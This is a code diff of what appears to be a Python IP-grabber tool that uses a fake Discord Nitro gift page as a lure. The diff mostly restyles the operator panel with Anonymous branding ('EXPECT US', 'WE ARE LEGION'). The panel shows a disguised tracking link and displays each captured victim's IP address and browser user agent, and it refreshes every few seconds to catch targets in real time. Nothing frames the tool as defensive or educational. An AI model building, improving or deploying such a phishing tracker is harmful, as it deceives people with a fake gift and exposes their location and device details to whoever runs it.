@@ -97,20 +97,20 @@ DISCORD_NITRO_HTML = """
 </html>
 """
 
-# Template HTML do Painel Anônimo com Blur, Radar Satélite e Torre de Sinal Piscando
+# Template HTML do Painel com a Máscara do Anonymous de Fundo
 PANEL_HTML = """
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GLOBAL_INTERCEPT // SECURE TERMINAL</title>
+    <title>ANONYMOUS_INTERCEPT // SECURE TERMINAL</title>
     <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; }
         body {
-            background-color: #020502;
-            color: #00ff66;
+            background-color: #030712;
+            color: #38bdf8;
             font-family: 'Share Tech Mono', monospace;
             margin: 0;
             padding: 20px;
@@ -118,21 +118,23 @@ PANEL_HTML = """
             height: 100vh;
         }
 
-        /* Fundo com efeito de Radar / Satélite Global Global */
-        .bg-radar {
+        /* Fundo com a Máscara do Anonymous estilizada e marca d'água centralizada */
+        .bg-anonymous {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at center, rgba(0, 20, 10, 0.8) 0%, rgba(2, 5, 2, 0.95) 100%);
+            background: linear-gradient(rgba(3, 7, 18, 0.85), rgba(3, 7, 18, 0.92)), 
+                        url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1920&auto=format&fit=crop') no-repeat center center;
+            background-size: cover;
             z-index: -2;
         }
 
-        /* Efeito de Blur Cibernético e Scanlines */
+        /* Efeito de Scanlines e Blur */
         body::before {
             content: " ";
             display: block;
             position: fixed;
             top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(56, 189, 248, 0.02), rgba(0, 0, 0, 0), rgba(56, 189, 248, 0.02));
             z-index: 99999;
             background-size: 100% 4px, 6px 100%;
             pointer-events: none;
@@ -141,16 +143,16 @@ PANEL_HTML = """
         .container { 
             max-width: 900px; 
             margin: 0 auto; 
-            background: rgba(5, 12, 8, 0.75);
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(0, 255, 102, 0.3);
+            background: rgba(15, 23, 42, 0.82);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(56, 189, 248, 0.3);
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0 0 30px rgba(0, 255, 102, 0.1);
+            box-shadow: 0 0 30px rgba(56, 189, 248, 0.15);
         }
 
         header {
-            border-bottom: 1px solid rgba(0, 255, 102, 0.4);
+            border-bottom: 1px solid rgba(56, 189, 248, 0.3);
             padding-bottom: 15px;
             margin-bottom: 25px;
             display: flex;
@@ -158,74 +160,74 @@ PANEL_HTML = """
             align-items: center;
         }
 
-        h1 { margin: 0; font-size: 22px; text-shadow: 0 0 8px rgba(0,255,102,0.5); letter-spacing: 2px; }
+        h1 { margin: 0; font-size: 22px; color: #f8fafc; text-shadow: 0 0 10px rgba(56,189,248,0.5); letter-spacing: 2px; }
 
-        /* Torre de Sinal Piscando (Estilo Alerta Satélite) */
+        /* Torre de Sinal Piscando */
         .signal-tower {
             display: flex;
             align-items: center;
             gap: 8px;
             font-size: 13px;
-            color: #ff0055;
+            color: #38bdf8;
             font-weight: bold;
-            background: rgba(255, 0, 85, 0.1);
+            background: rgba(56, 189, 248, 0.1);
             padding: 6px 12px;
-            border: 1px solid rgba(255, 0, 85, 0.4);
+            border: 1px solid rgba(56, 189, 248, 0.4);
             border-radius: 4px;
         }
         .tower-light {
             width: 10px;
             height: 10px;
-            background-color: #ff0055;
+            background-color: #38bdf8;
             border-radius: 50%;
-            box-shadow: 0 0 10px #ff0055;
+            box-shadow: 0 0 10px #38bdf8;
             animation: pulse-tower 1s infinite alternate;
         }
         @keyframes pulse-tower {
-            0% { opacity: 0.2; transform: scale(0.8); }
-            100% { opacity: 1; transform: scale(1.2); box-shadow: 0 0 15px #ff0055; }
+            0% { opacity: 0.3; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1.2); box-shadow: 0 0 15px #38bdf8; }
         }
 
         .card {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid #004411;
+            background: rgba(3, 7, 18, 0.7);
+            border: 1px solid rgba(56, 189, 248, 0.2);
             padding: 20px;
             border-radius: 4px;
             margin-bottom: 20px;
         }
-        h3 { margin-top: 0; color: #fff; font-size: 15px; letter-spacing: 1px; border-left: 3px solid #00ff66; padding-left: 10px; }
+        h3 { margin-top: 0; color: #f8fafc; font-size: 15px; letter-spacing: 1px; border-left: 3px solid #38bdf8; padding-left: 10px; }
         
         .link-box {
-            background: #000;
-            border: 1px dashed #00ff66;
+            background: #020617;
+            border: 1px dashed rgba(56, 189, 248, 0.4);
             padding: 12px;
             font-size: 15px;
-            color: #00ff66;
+            color: #38bdf8;
             word-break: break-all;
             letter-spacing: 1px;
         }
 
         .target-box {
-            background: #000;
-            border: 1px solid #ff0055;
+            background: #020617;
+            border: 1px solid rgba(56, 189, 248, 0.4);
             padding: 20px;
             position: relative;
-            box-shadow: inset 0 0 15px rgba(255,0,85,0.1);
+            box-shadow: inset 0 0 15px rgba(56,189,248,0.05);
         }
-        .target-item { margin-bottom: 12px; font-size: 15px; }
-        .ip-highlight { color: #ff0055; font-weight: bold; text-shadow: 0 0 6px rgba(255,0,85,0.6); font-size: 22px; }
+        .target-item { margin-bottom: 12px; font-size: 15px; color: #cbd5e1; }
+        .ip-highlight { color: #f43f5e; font-weight: bold; text-shadow: 0 0 8px rgba(244,63,94,0.6); font-size: 22px; }
         
-        .footer { text-align: center; font-size: 11px; color: #006622; margin-top: 30px; letter-spacing: 2px; }
+        .footer { text-align: center; font-size: 11px; color: #64748b; margin-top: 30px; letter-spacing: 2px; }
     </style>
 </head>
 <body>
-    <div class="bg-radar"></div>
+    <div class="bg-anonymous"></div>
     <div class="container">
         <header>
-            <h1>[ANON_SYS] // GLOBAL_RADAR</h1>
+            <h1>[ANON_SYS] // SECURE_TERMINAL</h1>
             <div class="signal-tower">
                 <div class="tower-light"></div>
-                SATELLITE LINK: ACTIVE
+                EXPECT US
             </div>
         </header>
 
@@ -242,20 +244,19 @@ PANEL_HTML = """
                     <div class="target-item"><strong>TARGET_IP:</strong> <span class="ip-highlight">{{ log.ip }}</span></div>
                     <div class="target-item"><strong>DEVICE_AGENT:</strong> {{ log.user_agent }}</div>
                 {% else %}
-                    <div style="color: #446655; text-align: center; padding: 15px;">[ AGUARDANDO SINAL DO ALVO... ]</div>
+                    <div style="color: #64748b; text-align: center; padding: 15px;">[ AGUARDANDO SINAL DO ALVO... ]</div>
                 {% endif %}
             </div>
         </div>
 
         <div class="footer">
-            ENCRYPTION: SHIELD-X // PROTOCOL: STEALTH_ON
+            WE ARE LEGION // PROTOCOL: STEALTH_ON
         </div>
     </div>
 
     <script>
         document.getElementById('track-link').innerText = 'https://sl1nk.com/discord-nitro-gift-7x9kl5t';
         
-        // Atualiza a cada 3 segundos automaticamente para capturar o alvo em tempo real
         setTimeout(function(){
             window.location.reload();
         }, 3000);
